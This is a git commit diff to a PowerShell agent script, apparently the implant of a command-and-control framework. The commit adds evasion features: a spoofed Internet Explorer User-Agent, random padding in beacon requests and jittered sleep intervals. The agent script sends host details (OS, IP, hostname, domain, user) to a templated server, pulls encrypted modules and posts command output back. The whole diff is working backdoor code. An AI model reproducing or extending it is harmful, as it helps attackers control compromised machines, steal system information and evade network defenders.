02b7d323107cbb8278cee8713c8be7105a4c93ed
darkz3ro <darkz3ro@localhost.localdomain>
2020-06-07 00:44:54 +0300

    added jitter , variable length request and changed all the request to post without parameter in the URL

--- agents/payload2.ps1
+++ agents/payload2.ps1
@@ -56,7 +56,7 @@ function load($module)
 
             $modulename = enc -key $key -un $module
             $postParams = @{data=$modulename}
-            $re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
+            $re=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
             $modulecontent=dec -key $key -enc $re.Content
 
 
@@ -73,33 +73,39 @@ $domain = (Get-WmiObject Win32_ComputerSystem).Domain;
 $IP=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
 $random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
 $agent="$random-img.jpeg"
-$finaldata="data=$os**$IP**$arch**$hostname**$domain**$whoami**$pid"
+$finaldata="data=$os**$IP**$arch**$hostname**$domain**$whoami**$pid&resource=$agent"
 $wc3 = new-object net.WebClient
       $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}?page=$agent",$finaldata)
+      $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}",$finaldata)
 $progressPreference = 'silentlyContinue';
 
 $wc3 = New-Object system.Net.WebClient;
 while($true){
-$req = [System.Net.WebRequest]::Create("{HTTP}://{ip}:{port}{cmd}?page=$agent")
-$resp = $req.GetResponse()
-$reqstream = $resp.GetResponseStream()
-$stream = new-object System.IO.StreamReader $reqstream
-$enc = $stream.ReadToEnd()
-
+$seed=[int](Get-Date -UFormat "%s")%97
+#secho $seed
+$rand=Get-Random -Minimum 50 -Maximum 250 -SetSeed $seed
+$data=-join ((65..90)*500 + (97..122)*500 | Get-Random -Count $rand | % {[char]$_});
+$postParams=@{resource=$agent;authentication=$data}
+$enc=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{cmd} -Method POST -Body $postParams #?page=$agent -Method GET
+$enc=$enc.Content
 
 if($enc -eq "REGISTER"){
 $wc3 = new-object net.WebClient
       $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}?page=$agent",$finaldata)
+      $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}",$finaldata)
 $progressPreference = 'silentlyContinue';
 continue
 }
-if($enc -eq "kill"){
-exit
-}
-
-if($enc -eq "-"){
+$reg=echo $enc | select-string -Pattern "\-\*\-\*\-\*"
+if($reg)
+#$enc -eq "-")
+{
+$seed=[int](Get-Date -UFormat "%s")
+$min=[int]$beacon/2+1
+$max=[int]$beacon+1
+$beacon=Get-Random -Minimum $min -Maximum $max -SetSeed $seed
 sleep $beacon
 }
 else{
@@ -140,9 +146,10 @@ $output="$output$badoutput"
 $redata=enc -key $key -un $output
 
 
-$postParams = @{data=$redata}
+$postParams = @{resource=$agent;data=$redata}
 
-$re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{re}?page=$agent -Method POST -Body $postParams
+$re=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{re} -Method POST -Body $postParams
+
 $re=" "
 
 }
